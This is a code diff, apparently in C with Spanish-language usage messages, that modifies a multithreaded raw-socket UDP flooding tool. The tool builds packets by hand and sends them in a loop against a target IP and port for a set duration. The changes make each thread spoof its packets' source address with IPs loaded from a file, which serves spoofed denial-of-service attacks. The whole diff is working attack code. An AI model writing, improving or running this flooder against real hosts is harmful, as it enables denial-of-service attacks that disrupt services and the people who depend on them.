@@ -12,6 +12,7 @@
 #define BUFFER_SIZE 1024
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
+#define MAX_IPS 100
 
 static unsigned long int Q[4096], c = 362436;
 static unsigned int floodport;
@@ -19,6 +20,7 @@ static unsigned int udport;
 volatile int limiter;
 volatile unsigned int pps;
 volatile unsigned int sleeptime = 100;
+char target_ip[MAX_IP_LENGTH];
 
 void init_rand(unsigned long int x) {
     int i;
@@ -133,7 +135,7 @@ int load_ips(const char *filename, char ips[][MAX_IP_LENGTH], int max_ips) {
 }
 
 void *flood(void *par1) {
-    char *target_ip = (char *)par1;
+    char *src_ip = (char *)par1;
     char datagram[MAX_PACKET_SIZE];
     struct iphdr *iph = (struct iphdr *)datagram;
     struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
@@ -172,7 +174,7 @@ void *flood(void *par1) {
 
     udph->dest = htons(udport);
 
-    iph->saddr = inet_addr(inet_ntoa(addr.sin_addr));
+    iph->saddr = inet_addr(src_ip);
     iph->daddr = sin.sin_addr.s_addr;
     iph->check = csum((unsigned short *)datagram, iph->tot_len);
 
@@ -207,7 +209,7 @@ void *flood(void *par1) {
         udph->len = htons(sizeof(struct udphdr) + payload_size);
         udph->check = 0;
         udph->dest = htons(udport);
-        iph->saddr = inet_addr(inet_ntoa(addr.sin_addr));
+        iph->saddr = inet_addr(src_ip);
         iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
         iph->ttl = randnum(64, 128);
         iph->check = csum((unsigned short *)datagram, iph->tot_len);
@@ -215,39 +217,43 @@ void *flood(void *par1) {
         udph->check = udpcsum(iph, udph, payload_size);
         sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
         pps++;
-        usleep(1900);
+        usleep(sleeptime);
     }
+
+    close(s);
+    return 0;
 }
 
 int main(int argc, char *argv[]) {
-    if (argc < 6) {
-        fprintf(stdout, "Uso: %s <número de hilos> <puerto flood> <IP del archivo> <tiempo> <puerto UDP>\n", argv[0]);
+    if (argc != 6) {
+        fprintf(stderr, "Uso: %s <IP destino> <Puerto destino> <Número de hilos> <Tiempo> <Archivo IPs>\n", argv[0]);
         return 1;
     }
 
-    int thread_count = atoi(argv[1]);
+    strncpy(target_ip, argv[1], MAX_IP_LENGTH);
     floodport = atoi(argv[2]);
-    char *file_ip = argv[3];
-    unsigned int duration = atoi(argv[4]);
-    udport = atoi(argv[5]);
+    int num_threads = atoi(argv[3]);
+    int duration = atoi(argv[4]);
+    char *ips_file = argv[5];
 
-    char ips[100][MAX_IP_LENGTH];
-    int ip_count = load_ips(file_ip, ips, 100);
-
-    if (ip_count < 0) {
-        fprintf(stderr, "Error al cargar IPs desde el archivo.\n");
+    char ips[MAX_IPS][MAX_IP_LENGTH];
+    int num_ips = load_ips(ips_file, ips, MAX_IPS);
+    if (num_ips <= 0) {
         return 1;
     }
 
-    pthread_t threads[thread_count];
-    for (int i = 0; i < thread_count; i++) {
-        int ip_index = i % ip_count;
+    pthread_t threads[num_threads];
+    for (int i = 0; i < num_threads; i++) {
+        int ip_index = i % num_ips;
         pthread_create(&threads[i], NULL, flood, (void *)ips[ip_index]);
-        usleep(3000);
     }
 
     sleep(duration);
-    printf("Ataque finalizado\n");
+
+    for (int i = 0; i < num_threads; i++) {
+        pthread_cancel(threads[i]);
+        pthread_join(threads[i], NULL);
+    }
 
     return 0;
 }
